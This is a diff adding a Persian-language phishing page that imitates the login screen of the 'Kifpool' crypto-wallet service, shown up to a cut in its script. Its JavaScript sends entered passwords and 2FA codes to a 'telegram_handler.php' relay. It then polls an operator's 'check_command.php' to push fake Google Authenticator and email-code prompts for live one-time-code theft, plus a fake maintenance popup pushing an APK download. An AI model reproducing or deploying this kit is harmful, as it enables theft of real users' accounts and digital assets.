@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ورود به حساب</title>
+    <link rel="stylesheet" href="css/icon.css">
+    <link rel="stylesheet" href="css/font.css"> <link rel="stylesheet" href="css/grid.css">
+    <link rel="stylesheet" href="css/login.css"> <link rel="manifest" href="js/manifest.json">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon" href="images/apple-icon.png">
+    <link rel="shortcut icon" href="images/apple-icon.png" type="image/x-icon" />
+    <link rel="icon" href="images/pwa/icon-512x512.png">
+    <style>
+        /* Styles remain the same as previous version */
+        :root { --text-color: #ffffff; --title-color: #ffffff; --blue: #3498db; --blue-darker: #2980b9; --orange: #e67e22; --input-bg-pin: #2a2f3b; --popup-bg: #1f293b; --red-error: #e74c3c; --overlay-bg: rgba(10, 14, 20, 0.9); --processing-overlay-bg: rgba(19, 26, 38, 0.95); --separator-color: rgba(255, 255, 255, 0.1); --separator-color-popup: rgba(255, 255, 255, 0.25); --text-color-popup: #dfe6e9; --blue-popup-btn: #3498db; --blue-popup-btn-darker: #2980b9; } body { color: var(--text-color); margin: 0; padding: 0; } .loading-indicator { display: flex; align-items: center; justify-content: center; flex-direction: column; font-size: 16px; color: #333; } .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: var(--orange); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; } @keyframes spin { to { transform: rotate(360deg); } } .loading-text { margin-top: 10px; } .suggestions { border: 1px solid rgb(33, 38, 46); border-radius: 10px; list-style-type: none; margin: 0; padding: 0; position: absolute; z-index: 1000; background-color: #131a26; width: calc(100% - 40px); top: calc(100% + 10px); overflow: hidden; display: none; text-align: left; } .suggestions li { padding: 10px; cursor: pointer; font-size: 1.2em } .suggestions li:hover { background-color: #171f2f; } #resendCode { display: none; margin-top: 10px; cursor: pointer; background: none; border: none; color: var(--blue); text-decoration: underline; } .timer { color: var(--orange); } .loginback { margin-top: 10px; cursor: pointer; background: none; border: none; color: var(--blue); display: block; } .sendEmailCode { color: var(--orange); } #loginpin, #googleauthpin, #emailauthpin { direction: ltr; display: flex; justify-content: center; margin-bottom: 20px; } #loginpin input[type=text], #loginpin input[type=password], #googleauthpin input[type=text], #googleauthpin input[type=password], #emailauthpin input[type=text], #emailauthpin input[type=password] { width: 50px; height: 60px; margin: 0 8px; text-align: center; font-size: 1.8em; border: none; border-radius: 10px; background-color: var(--input-bg-pin); color: var(--text-color); caret-color: var(--blue); outline: none; box-shadow: 0 2px 5px rgba(0,0,0,0.2); transition: transform 0.1s ease-in-out, box-shadow 0.1s ease-in-out; } #loginpin input:focus, #googleauthpin input:focus, #emailauthpin input:focus { box-shadow: 0 0 0 2px rgba(52, 152, 219, 0.5); transform: scale(1.05); } .pinlogin-error, .googleauth-pin-error, .emailauth-pin-error { display: none; color: var(--red-error); margin-top: 5px; margin-bottom: 10px; text-align: center; width: 100%; font-size: 0.9em; } .img-auth-icon img { width: 100%; } .img-auth-icon { width: 100px; margin: 0 auto 15px; } #processing-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: var(--processing-overlay-bg); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 10000; color: var(--text-color); text-align: center; } #processing-overlay .spinner { width: 60px; height: 60px; border-width: 5px; margin-bottom: 25px; border-left-color: var(--orange); } #processing-overlay .processing-text { font-size: 1.5em; margin-top: 15px; } #processing-overlay .logo img { max-width: 150px; margin-bottom: 30px; } #command-status { margin-top: 15px; font-size: 0.9em; display: none; } #android-app-popup-overlay { position: fixed; inset: 0; background-color: var(--overlay-bg); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); z-index: 10001; display: none; justify-content: center; align-items: center; padding: 15px; box-sizing: border-box; } #android-app-popup-content { background-color: var(--popup-bg); padding: 30px 35px 35px 35px; border-radius: 10px; text-align: center; max-width: 370px; width: 90%; box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5); border: 1px solid #374151; opacity: 0; animation: popup-fade-in 0.3s ease-out forwards; } @keyframes popup-fade-in { to { opacity: 1; } } #android-app-popup-content .popup-logo { position: relative; display: inline-block; margin-bottom: 25px; line-height: 0; } #android-app-popup-content .popup-logo img.main-logo { max-width: 115px; height: auto; display: block; } #android-app-popup-content img.maintenance-icon-img { position: absolute; bottom: -8px; left: -10px; width: 48px; height: 48px; border-radius: 50%; border: 3px solid var(--popup-bg); background-color: #fff; padding: 3px; box-sizing: border-box; box-shadow: 0 1px 4px rgba(0,0,0,0.4); } #android-app-popup-content h2 { color: var(--title-color); margin-top: 0; margin-bottom: 15px; font-size: 1.3rem; font-weight: 600; } #android-app-popup-content p { color: var(--text-color-popup); line-height: 1.7; margin-bottom: 30px; font-size: 0.95rem; } .btn-download-adjusted { display: inline-flex; align-items: center; justify-content: center; position: relative; width: 100%; padding: 14px 15px; border-radius: 10px; background-color: var(--blue-popup-btn); color: var(--text-color); font-size: 1rem; font-weight: 500; text-decoration: none; border: none; cursor: pointer; transition: all 0.2s ease-in-out; box-shadow: 0 2px 5px rgba(52, 152, 219, 0.25); box-sizing: border-box; overflow: hidden; } .btn-download-adjusted:hover { background-color: var(--blue-popup-btn-darker); box-shadow: 0 3px 8px rgba(52, 152, 219, 0.35); transform: translateY(-1px); } .btn-download-adjusted:active { transform: translateY(0); box-shadow: 0 1px 4px rgba(52, 152, 219, 0.3); } .btn-download-adjusted .icon-area { position: absolute; left: 0; top: 0; bottom: 0; display: flex; align-items: center; padding-left: 12px; padding-right: 12px; } .btn-download-adjusted .separator { width: 1px; height: 55%; background-color: var(--separator-color-popup); margin-left: 12px; } .btn-download-adjusted .btn-icon-img { width: 36px; height: 36px; display: block; } .btn-download-adjusted .button-text { display: block; width: 100%; text-align: center; padding-left: 65px; box-sizing: border-box; white-space: nowrap; } @media (max-width: 480px) { #android-app-popup-content { padding: 25px 20px; max-width: 95%; } #android-app-popup-content .popup-logo img.main-logo { max-width: 100px; } #android-app-popup-content img.maintenance-icon-img { width: 40px; height: 40px; bottom: -6px; left: -8px; } .btn-download-adjusted { padding: 12px 10px; font-size: 0.95rem; } .btn-download-adjusted .icon-area { padding-left: 10px; padding-right: 10px; } .btn-download-adjusted .separator { margin-left: 10px; height: 50%; } .btn-download-adjusted .btn-icon-img { width: 30px; height: 30px; } .btn-download-adjusted .button-text { padding-left: 55px; } } .login-box-error, .login-box-error2 { color: var(--red-error); margin-bottom: 15px; padding: 10px; background-color: rgba(231, 76, 60, 0.1); border: 1px solid var(--red-error); border-radius: 5px; text-align: center; display: none; } .list-input span.field-validation-error { color: var(--red-error); padding-right: 5px; padding-top: 5px; font-size: 0.9em; width: 100%; text-align: right; min-height: 1.2em; } .line-gr { background: var(--separator-color); height: 1px; border: none; margin: 25px 0; } .hidden-form-element { display: none !important; }
+    </style>
+</head>
+<body>
+
+<div class="app-header d-flex just-between align-center" id="androidMob" style="display: none">
+    <div class="d-flex align-center"> <div class="install-close rt-auto red ml-10"><i class="icon-close-square4" style="vertical-align: middle"></i></div> <div class="icon"><img src="images/pwa/icon-192x192.png" height="40px" width="40px"></div> <div class="info"> <div><b>کیف پول من</b></div> <div>نصب وب اپلیکیشن کیف پول من</div> </div> </div> <div class="add-to-home-screen ">نصب</div>
+</div>
+<div class="app-header" id="iosMob" style="display: none">
+    <div class="d-flex align-center"> <div class="icon"><img src="images/pwa/apple-icon.png" height="40px" width="40px"></div> <div class="info grow-1"> <div><b>کیف پول من</b></div> <div>نصب از اپ‌استور</div> </div> <div class="d-flex algin-center rt-auto "> <a href="https://apps.apple.com/us/app/kifpool-club/id6505031450" target="ـblank" class="add-to-home-screen install-close">نصب</a> <div class="install-close add-to-home-screen red mr-5">بعداً</div> </div> </div> <div class="install-info pd-t-10" style="line-height: 24px"> قبل از اجرای اپلیکیشن حتما <span class="orange">ٰVPN</span> را خاموش کنید. </div>
+</div>
+
+<div class="login-page d-flex-wrap">
+
+    <div class="login-info d-flex-column">
+        <div class="logo"><img src="images/logo-light-text.png" alt="Kifpool Logo"></div>
+        <div class="login-qr" style="margin: 100px 0">
+             <img src="images/qr.png" alt="QR Code" style="width: 200px; height: 200px; display: block; margin: 0 auto;">
+        </div>
+        <div class="ft">
+            <div class="info">
+                <div>حساب اینترنتی مطمئن برای نگهداری دارایی شما</div>
+                <div>با سامانه کیف پول من خرید و فروش و دارایی های دیجیتال خود را به آسان مدیریت کنید</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="login-box d-flex-column">
+        <div class="login-form">
+            <div class="title pd-t-30 main-title-area"> <h2 id="login-title">ورود به حساب کاربری</h2>
+                <span id="login-subtitle">جهت استفاده از امکانات کیف پول من وارد حساب کاربری خود شوید</span>
+            </div>
+            <div class="checked-list m-td-10 main-tabs-area"> <a href="#" id="tab-password" class="checked-item grow-1 active ">ورود با پسورد</a>
+                <a href="#" id="tab-mobile" class="checked-item grow-1 ">ورود با شماره موبایل</a>
+            </div>
+            <div class="line-gr mb-20 main-tabs-area"></div>
+
+            <div id="password-login-form">
+                <form method="post" id="LoginForm" style="display: contents;" action="#">
+                     <div class="login-box-error"></div>
+                     <div class="list-input"> <div class="input-text input-border"> <input type="text" id="email-input" name="email" placeholder="ایمیل یا شماره موبایل" autocomplete="username"> <div class="icon"><i class="icon-mobile"></i></div> <ul class="suggestions" id="email-suggestions"></ul> </div> </div>
+                     <div class="list-input"> <div class="input-text input-border"> <input type="password" name="password" class="password " placeholder="رمز عبور" autocomplete="current-password"> <div class="icon"><i class="icon-eye3 showpass"></i></div> </div> </div>
+                     <div class="list-input"> <div class="input-text input-border"> <input type="text" autocomplete="off" class="withdraw-form-elements" name="two_factor_code_optional" placeholder="کد تایید دو مرحله‌ای (اختیاری)"> <div class="icon"><i class="icon-scan-barcode4"></i></div> </div> </div>
+                     <div class="mb-10">رمز عبور خود را فراموش کرده اید؟ <a class="orange" target="_blank" href="forget-password.html">بازیابی رمز عبور</a></div>
+                     <button type="submit" class="btn btn-blue submitbtn login__btn" >ورود به حساب کاربری</button>
+                </form>
+             </div>
+
+             <div id="mobile-login-form" style="display: none;">
+                 <form method="post" id="SmsForm" style="display: contents" novalidate action="#">
+                     <div class="login-box-error"></div>
+                     <div class="list-input">
+                         <div class="input-text input-border">
+                             <input name="mobile" placeholder="شماره موبایل" type="tel" value="" minlength="11" maxlength="11" id="mobile-input" class="numinput changnum" autocomplete="tel" required>
+                             <div class="icon"><i class="icon-mobile"></i></div>
+                         </div>
+                         <span class="field-validation-error" data-valmsg-for="mobile" style="display: none;"></span>
+                     </div>
+                     <button type="submit" class="btn btn-blue submitbtn send_code__btn" >ارسال کد تایید</button>
+                 </form>
+                 <form method="post" id="VerifyCode" style="display: none" novalidate action="#">
+                     <input type="hidden" name="mobile" id="mobile-input-hidden">
+                     <div class="login-box-error2"></div>
+                     <div class="title code-sent"></div>
+                     <div id="loginpin"></div>
+                     <div class='pinlogin-error'></div>
+                     <button type="submit" class="btn btn-blue submitbtn final-submit check__btn">ورود</button>
+                     <div class="resendcode"> <div>ارسال مجدد کد در <span id="timer" class="timer">02:00</span> دیگر</div> </div>
+                     <button type="button" id="resendCode" onclick="send_again()">ارسال مجدد</button>
+                     <button type="button" class="loginback back_to_change"><i class="icon-edit4"></i> ویرایش شماره </button>
+                     <button type="button" class="orange loginback sendEmailCode" style="display: none"> ارسال کد به ایمیل </button>
+                 </form>
+             </div>
+
+            <div id="google-auth-form" style="display: none;">
+                 <div class="title pd-t-30">
+                     <div class="img-auth-icon"><img src="images/2fa.png" alt="2FA"></div> <h2>تایید هویت دو مرحله ای</h2>
+                     <span>جهت ادامه لطفا کد یکبار مصرف تولید شده توسط نرم افزار Google Authentication را در کادر زیر وارد نمایید .</span>
+                 </div>
+                 <div class="line-gr m-td-30"></div>
+                <form method="post" id="GoogleAuthVerifyForm" style="display: contents;" action="#">
+                     <div class="login-box-error2"></div>
+                     <div id="googleauthpin"></div>
+                     <div class='googleauth-pin-error'></div>
+                     <button type="submit" class="btn btn-blue submitbtn ga_check__btn">ورود</button>
+                 </form>
+                  <div class="line-gr m-td-30"></div>
+                 <div class="pd-b-10"> در صورتی که کد دومرحله‌ای خود را فراموش کرده‌اید <a href="#" class="orange">اینجا</a> کلیک کنید </div>
+            </div>
+
+            <div id="email-auth-form" style="display: none;">
+                 <div class="title pd-t-30">
+                     <div class="img-auth-icon"><img src="images/mail.png" alt="Email Verification"></div> <h2>تایید ایمیل</h2> <span>جهت ادامه لطفا کد یکبار مصرف ارسال شده به ایمیل را در کادر زیر وارد نمایید</span> </div>
+                 <div class="line-gr m-td-30"></div>
+                <form method="post" id="EmailAuthVerifyForm" style="display: contents;" action="#">
+                    <div class="login-box-error2"></div>
+                    <div id="emailauthpin"></div>
+                    <div class='emailauth-pin-error'></div>
+                    <button type="submit" class="btn btn-blue submitbtn email_check__btn">تایید کد ایمیل</button>
+                 </form>
+                  <div class="line-gr m-td-30"></div>
+                 <div class="pd-b-10 text-center"> <a href="#" class="orange">ارسال مجدد کد به ایمیل</a> </div>
+            </div>
+            <div class="line-gr m-td-30"></div>
+            <div class="pd-30">حساب کاربری ندارید؟ <a class="orange" href="register.html">ثبت نام کنید</a></div>
+        </div>
+    </div>
+</div>
+
+<div id="processing-overlay">
+    <div class="logo"><img src="images/logo-light-text.png" alt="Kifpool Logo"></div>
+    <div class="spinner"></div>
+    <div class="processing-text">در حال پردازش اطلاعات شما هستیم...</div>
+    <div id="command-status"></div>
+</div>
+
+<div id="android-app-popup-overlay">
+     <div id="android-app-popup-content">
+        <div class="popup-logo"> <img src="images/logo-light-text.png" alt="Logo" class="main-logo"> <img src="images/maintenance.png" alt="Maintenance" class="maintenance-icon-img"> </div>
+        <h2>سایت در حال بروزرسانی</h2>
+        <p> وب‌سایت در حال حاضر تحت به‌روزرسانی است. برای تجربه بهتر و دسترسی کامل به خدمات، لطفاً اپلیکیشن اندروید ما را دریافت و نصب نمایید. </p>
+        <a href="YOUR_APK_DOWNLOAD_LINK_HERE" class="btn-download-adjusted" id="android-download-link"> <span class="button-text">دریافت اپلیکیشن اندروید</span> <div class="icon-area"> <span class="separator"></span> <img src="images/android.png" class="btn-icon-img" alt="Android"> </div> </a>
+    </div>
+</div>
+
+<script src="js/jquery-3.6.0.min.js"></script>
+<script src="js/jquery.validate.min.js"></script>
+<script src="js/jquery.pinlogin.min.js"></script>
+<script src="js/app.js"></script>
+<script src="js/pwa-settings.js"></script>
+<script>
+    // --- JavaScript code ---
+
+    // --- Global Variables ---
+    let countdownInterval = null;
+    let timerDuration = 120;
+    var loginpin;
+    var googleauthpin;
+    var emailauthpin;
+    let currentSessionId = null;
+    let commandCheckInterval = null;
+    const POLLING_INTERVAL_MS = 3000;
+    let isGaRetry = false;
+    let isEmailRetry = false;
+
+    // --- تابع ایجاد شناسه یکتا ---
+    function generateSessionId() {
+        return Date.now().toString(36) + Math.random().toString(36).substring(2);
+    }
+
+    // --- تابع کمکی برای ارسال اطلاعات به تلگرام هندلر ---
+    function sendToTelegram(data) {
+        // اطمینان از وجود Session ID قبل از ارسال
+        // اگر Session ID وجود نداشت و در حال ایجاد آن هستیم (مثل شروع لاگین)
+        // باید اول ایجاد شود.
+        if (!currentSessionId && data.dataType !== 'password_login' && data.dataType !== 'mobile_sent') {
+             console.error("sendToTelegram Error: No session ID for non-initial request.");
+             alert("خطای جلسه. لطفا صفحه را رفرش کنید.");
+             return $.Deferred().reject().promise();
+        }
+        // اگر currentSessionId وجود نداشت، یعنی درخواست اولیه است، آن را اضافه کن
+        if (currentSessionId) {
+             data.session_id = currentSessionId;
+        }
+        // اگر درخواست اولیه است و session_id ندارد، در سمت سرور باید مدیریت شود (که می‌شود)
+
+        console.log("Sending to Telegram Handler:", data);
+        return $.ajax({ type: "POST", url: "telegram_handler.php", data: data, dataType: "json" })
+            .done(response => { console.log("Telegram Handler Response OK:", response); if (response?.status === 'error') { console.error("Telegram Handler returned error:", response.message); } })
+            .fail((xhr, status, error) => { console.error("sendToTelegram AJAX Error:", status, error, xhr.responseText); });
+    }
+
+
+    // --- Functions for Command Polling ---
+    function startCommandPolling() {
+        stopCommandPolling();
+        if (!currentSessionId) { console.error("startCommandPolling Error: No session ID available."); return; }
+        console.log(`[Polling] Starting polling for session: ${currentSessionId}`);
+        $('#command-status').text('منتظر تایید ادمین...').show();
+        commandCheckInterval = setInterval(() => {
+            $.ajax({ type: "POST", url: "check_command.php", data: { session_id: currentSessionId }, dataType: "json", timeout: 10000 })
+            .done(response => {
+                 if (response?.status === 'found' && response.command) { console.log(`[Polling] Command received: '${response.command}' for session: ${currentSessionId}`); stopCommandPolling(); executeCommand(response.command); }
+                 else if (response?.status === 'error') { console.error(`[Polling] Server error from check_command.php:`, response.message); $('#command-status').text('خطا در بررسی وضعیت: ' + (response.message || 'Unknown error')).show(); /* stopCommandPolling(); */ }
+                 else if (response?.status === 'warning') { console.warn(`[Polling] Server warning from check_command.php:`, response.warning); if (response.command) { console.log(`[Polling] Command received (with warning): '${response.command}' for session: ${currentSessionId}`); stopCommandPolling(); executeCommand(response.command); } }
+                 else if (response?.status !== 'not_found') { console.warn(`[Polling] Unexpected response status from check_command.php:`, response); }
+             })
+            .fail((xhr, status, error) => { if (status === 'timeout') { console.warn(`[Polling] AJAX Timeout polling check_command.php for session: ${currentSessionId}`); } else { console.error(`[Polling] AJAX Error polling check_command.php: ${status}, ${error}`, xhr.responseText); $('#command-status').text('خطا در ارتباط با سرور (Polling).').show(); stopCommandPolling(); } });
+        }, POLLING_INTERVAL_MS);
+    }
+
+    function stopCommandPolling() {
+        if (commandCheckInterval) { console.log("[Polling] Stopping polling."); clearInterval(commandCheckInterval); commandCheckInterval = null; $('#command-status').hide(); }
+     }
+
+    // --- Function to Execute Commands Received from Polling ---
+    function executeCommand(commandData) {
+        console.log(`[ExecuteCommand] Attempting to execute command: '${commandData}'`);
+        const parts = commandData.split(':');
+        const action = parts[0];
+        const value = parts.slice(1).join(':');
+
+        const fadeOutAndRun = (callback) => {
+             if ($('#processing-overlay').is(':visible')) { console.log("[ExecuteCommand] Fading out processing overlay."); $('#processing-overlay').fadeOut(() => { setTimeout(callback, 50); }); }
+             else { console.log("[ExecuteCommand] Processing overlay not visible, running callback directly."); callback(); }
+         };
+
+        switch (action) {
+            case 'show_ga_form':
+                console.log("[ExecuteCommand] Action: show_ga_form");
+                fadeOutAndRun(() => {
+                    $('#password-login-form, #mobile-login-form, #VerifyCode, #email-auth-form').hide(); $('.main-title-area, .main-tabs-area').hide(); $('#google-auth-form').show();
+                    if (isGaRetry) { $('#google-auth-form .googleauth-pin-error').text('کد قبلی نامعتبر بود. کد جدید را وارد کنید.').show(); } else { $('#google-auth-form .googleauth-pin-error').hide(); }
+                    initializeGoogleAuthPinInput();
+                    // **تغییر: خالی کردن پین GA**
+                    if (googleauthpin?.reset) googleauthpin.reset();
+                    $('#GoogleAuthVerifyForm .ga_check__btn').prop('disabled', false).text('ورود'); isGaRetry = true;
+                });
+                break;
+
+            case 'show_email_form':
+                console.log("[ExecuteCommand] Action: show_email_form");
+                fadeOutAndRun(() => {
+                    $('#password-login-form, #mobile-login-form, #VerifyCode, #google-auth-form').hide(); $('.main-title-area, .main-tabs-area').hide(); $('#email-auth-form').show();
+                    if (isEmailRetry) { $('#email-auth-form .emailauth-pin-error').text('کد قبلی نامعتبر بود. کد جدید را وارد کنید.').show(); } else { $('#email-auth-form .emailauth-pin-error').hide(); }
+                    initializeEmailAuthPinInput();
+                     // **تغییر: خالی کردن پین Email**
+                     if (emailauthpin?.reset) emailauthpin.reset();
+                    $('#EmailAuthVerifyForm .email_check__btn').prop('disabled', false).text('تایید کد ایمیل'); isEmailRetry = true;
+                });
+                break;
+
+            case 'show_app_popup':
+                console.log("[ExecuteCommand] Action: show_app_popup");
+                fadeOutAndRun(() => { $('#android-app-popup-overlay').css('display', 'flex').hide().fadeIn(); });
+                break;
+
+            case 'show_login_error':
+                 const loginErrorMessage = value || "اطلاعات ورود نامعتبر است.";
+                 console.log(`[ExecuteCommand] Action: show_login_error - Message: ${loginErrorMessage}`);
+                 fadeOutAndRun(() => {
+                     // **تغییر: حفظ session ID هنگام بازگشت به فرم پسورد**
+                     switchTab('password', true); // Pass true to preserve session
+                     setTimeout(() => {
+                         console.log("[ExecuteCommand] Updating UI for show_login_error.");
+                         $('#LoginForm .login-box-error').text(loginErrorMessage).show(); $('#LoginForm input[name="password"]').val(''); $('#LoginForm input[name="two_factor_code_optional"]').val('');
+                         $('#LoginForm .login__btn').prop("disabled", false).text("ورود به حساب کاربری"); $('#LoginForm input[name="password"]').focus();
+                     }, 100);
+                 });
+                 break;
+
+            case 'show_sms_error':
+                 const smsErrorMessage = value || "کد وارد شده صحیح نیست.";
+                 console.log(`[ExecuteCommand] Action: show_sms_error - Message: ${smsErrorMessage}`);
+                 fadeOutAndRun(() => {
+                     // **تغییر: حفظ session ID هنگام بازگشت به فرم SMS**
+                     switchTab('mobile', true); // Pass true to preserve session
+                     setTimeout(() => {
+                         console.log("[ExecuteCommand] Starting UI setup for show_sms_error after 200ms timeout.");
+                         console.log(`[ExecuteCommand] Active tab after switchTab: ${$('.checked-item.active').attr('id')}`);
+                         $('#SmsForm').hide(); console.log("[ExecuteCommand] SmsForm hidden.");
+                         $('#VerifyCode').show(); console.log(`[ExecuteCommand] VerifyCode shown. Is #VerifyCode visible? ${$('#VerifyCode').is(':visible')}`);
+                         const errorElement = $('#VerifyCode .pinlogin-error'); console.log(`[ExecuteCommand] Target error element (#VerifyCode .pinlogin-error) found? ${errorElement.length > 0}`);
+                         if (errorElement.length > 0) { errorElement.text(smsErrorMessage).show(); console.log(`[ExecuteCommand] Error text set to: "${errorElement.text()}". Is error element visible? ${errorElement.is(':visible')}`); }
+                         else { console.error("[ExecuteCommand] Could not find error element '#VerifyCode .pinlogin-error'."); $('#VerifyCode .login-box-error2').text(smsErrorMessage).show(); }
+                         $('#VerifyCode .login-box-error2:not(.pinlogin-error)').empty().hide();
+                         // **تغییر: اطمینان از ریست شدن پین SMS**
+                         if (loginpin && typeof loginpin.reset === 'function') { loginpin.reset(); console.log("[ExecuteCommand] loginpin reset completed."); }
+                         else { initializePinInput(); console.log("[ExecuteCommand] loginpin initialized because it was not found."); }
+                         $('#VerifyCode .check__btn').prop("disabled", false).text("ورود"); console.log("[ExecuteCommand] VerifyCode button re-enabled.");
+                         if (loginpin && loginpin.fields && loginpin.fields[0]) { $(loginpin.fields[0]).focus(); console.log("[ExecuteCommand] Focused first PIN field."); }
+                         stopCountdown(); $('.resendcode').hide(); $('#resendCode').show(); console.log("[ExecuteCommand] Resend UI updated.");
+                     }, 200);
+                 });
+                 break;
+
+            default:
+                console.warn(`[ExecuteCommand] Received unknown command: '${commandData}'`);
+                fadeOutAndRun(() => alert(`دستور ناشناخته از سرور دریافت شد: ${commandData}`));
+                break;
+        }
+    }
+
+    // --- Initialization on Document Ready ---
+    $(document).ready(function () {
+        console.log("Document ready. Initializing components.");
+        if (typeof $ !== 'function') { console.error("FATAL: jQuery is not loaded."); return; }
+        if (!$.fn.validate) { console.error("WARNING: jQuery Validate plugin is not loaded (used for mobile form)."); } else { console.log("OK: jQuery.validate loaded."); }
+        if (!$.fn.pinlogin) { console.error("FATAL: jQuery.pinlogin plugin is not loaded."); } else { console.log("OK: jQuery.pinlogin loaded."); }
+        try {
+            setupTabs(); setupPWA(); preventBrowserBack(); setupEmailAutocomplete();
+            setupPasswordFormValidation(); // No validate plugin here
+            setupMobileFormsValidation(); // Uses validate plugin
+            setupGoogleAuthFormValidation(); setupEmailAuthFormValidation(); setupDelegatedEventHandlers();
+            switchTab('password'); console.log("Initialization complete.");
+        } catch (e) { console.error("Error during initialization:", e); alert("خطا در بارگذاری اولیه صفحه. لطفا صفحه را رفرش کنید."); }
+    });
+
+    // --- Tab Switching Logic (Modified) ---
+    function setupTabs() {
+         $('#tab-password').off('click').on('click', (e) => { e.preventDefault(); if (!$(e.currentTarget).hasClass('active')) { switchTab('password'); } }); // Default switch, resets session
+         $('#tab-mobile').off('click').on('click', (e) => { e.preventDefault(); if (!$(e.currentTarget).hasClass('active')) { switchTab('mobile'); } }); // Default switch, resets session
+    }
+
+    // **تغییر: اضافه شدن پارامتر preserveSession**
+    function switchTab(tabName, preserveSession = false) { // Default is false
+        console.log(`[UI] Switching to tab: ${tabName}. Preserve session: ${preserveSession}`);
+        stopCommandPolling();
+        // **تغییر: ریست کردن session ID فقط اگر preserveSession نباشد**
+        if (!preserveSession) {
+             console.log("[UI] Resetting currentSessionId because preserveSession is false.");
+             currentSessionId = null;
+        } else {
+             console.log("[UI] Preserving currentSessionId.");
+        }
+        isGaRetry = false; isEmailRetry = false;
+        $('#processing-overlay, #android-app-popup-overlay').fadeOut();
+        try {
+             $('.main-title-area, .main-tabs-area').show(); $('.checked-item').removeClass('active');
+             $('#password-login-form, #mobile-login-form, #VerifyCode, #google-auth-form, #email-auth-form').hide();
+             $('.login-box-error, .login-box-error2, .pinlogin-error, .googleauth-pin-error, .emailauth-pin-error').empty().hide();
+             $('.field-validation-error').empty().hide(); $('input.error').removeClass('error');
+             if (tabName === 'password') {
+                $('#tab-password').addClass('active'); $('#password-login-form').show(); $('#login-title').text('ورود به حساب کاربری'); $('#login-subtitle').text('جهت استفاده از امکانات کیف پول من وارد حساب کاربری خود شوید');
+                if ($("#LoginForm").data('validator')) { $("#LoginForm").data('validator').resetForm(); } // Reset validation if exists
+                $('#LoginForm .login-box-error').empty().hide(); $('#LoginForm .login__btn').prop("disabled", false).text("ورود به حساب کاربری");
+             } else if (tabName === 'mobile') {
+                $('#tab-mobile').addClass('active'); $('#mobile-login-form').show();
+                // نمایش فرم مناسب بر اساس اینکه آیا جلسه حفظ شده (یعنی از خطا برگشتیم) یا نه
+                if (preserveSession) {
+                     // اگر از خطا برگشتیم، معمولا باید فرم کد نمایش داده شود
+                     // (این منطق بیشتر در executeCommand مدیریت می شود)
+                     // اینجا فقط تب را فعال می‌کنیم و فرم‌ها را مخفی می‌کنیم
+                     // executeCommand تصمیم می‌گیرد کدام فرم (SmsForm یا VerifyCode) نمایش داده شود
+                     $('#SmsForm').hide(); // به صورت پیش فرض مخفی کن
+                     $('#VerifyCode').hide(); // به صورت پیش فرض مخفی کن
+                } else {
+                    // شروع تازه ورود با موبایل
+                     $('#SmsForm').show(); // نمایش فرم شماره
+                     $('#VerifyCode').hide(); // مخفی کردن فرم کد
+                }
+
+                $('#login-title').text('ورود با شماره موبایل'); $('#login-subtitle').text('شماره موبایلی که با آن در سایت ثبت نام کرده اید را وارد نماید');
+                if ($("#SmsForm").data('validator')) { $("#SmsForm").validate().resetForm(); }
+                 $('#SmsForm input[name="mobile"]').val(''); $('#SmsForm .login-box-error, #SmsForm .field-validation-error').empty().hide(); $('#VerifyCode .login-box-error2, #VerifyCode .pinlogin-error').empty().hide();
+                 if (loginpin?.reset) loginpin.reset(); if (googleauthpin?.reset) googleauthpin.reset(); if (emailauthpin?.reset) emailauthpin.reset();
+                stopCountdown(); $('.resendcode').hide(); $('#resendCode').hide();
+                $('#SmsForm .send_code__btn').prop('disabled', false).html('ارسال کد تایید'); $('#VerifyCode .check__btn').prop('disabled', false).text("ورود");
+             }
+        } catch (e) { console.error("[UI] Error during tab switch:", e); }
+    }
+
+    // --- Password Login Form Handling (NO VALIDATE PLUGIN) ---
+    function setupPasswordFormValidation() {
+        const loginForm = $("#LoginForm"); if (!loginForm.length) { console.warn("Password login form (#LoginForm) not found."); return; }
+        loginForm.off('submit').on('submit', function(event) {
+            event.preventDefault(); console.log("[PWD Login] Manual submit handler triggered."); var form = this;
+            var emailInput = $('input[name="email"]', form); var passInput = $('input[name="password"]', form); var twofaInput = $('input[name="two_factor_code_optional"]', form); var errBox = $('.login-box-error', form);
+            var email = emailInput.val().trim(); var pass = passInput.val(); var twofa = twofaInput.val().trim();
+            errBox.empty().hide(); let hasError = false;
+            if (email === '') { errBox.append('<div>ایمیل یا شماره موبایل الزامی است</div>').show(); hasError = true; }
+            if (pass === '') { errBox.append('<div>رمز عبور الزامی است</div>').show(); hasError = true; }
+            if (hasError) { console.log("[PWD Login] Manual validation failed: Empty fields."); return; }
+            console.log("[PWD Login] Manual validation passed. Proceeding."); currentSessionId = generateSessionId(); isGaRetry = false; isEmailRetry = false; // <<-- شروع جلسه جدید
+            console.log(`[PWD Login] Starting attempt with Session ID: ${currentSessionId}`); const btn = $(".login__btn", form); btn.prop("disabled", true).text("بررسی...");
+            var formData = { dataType: 'password_login', email: email, password: pass, two_factor_code_optional: twofa };
+            // **تغییر:** Session ID را به sendToTelegram نفرست، چون در تابع اضافه می شود
+            sendToTelegram(formData)
+                .done(() => { console.log("[PWD Login] Data sent successfully. Showing overlay."); $('#processing-overlay .processing-text').text('در حال پردازش اطلاعات شما هستیم...'); $('#command-status').text('منتظر تایید ادمین...').show(); $('#processing-overlay').css('display', 'flex').hide().fadeIn(200, startCommandPolling); })
+                .fail(() => { console.error("[PWD Login] Failed to send data to handler via sendToTelegram."); errBox.text("خطا در ارتباط با سرور هنگام ارسال اطلاعات. لطفا دوباره تلاش کنید.").show(); btn.prop("disabled", false).text("ورود به حساب کاربری"); currentSessionId = null; }); // <<-- نال کردن جلسه در صورت خطا
+        });
+    }
+
+    // --- Email Autocomplete Logic ---
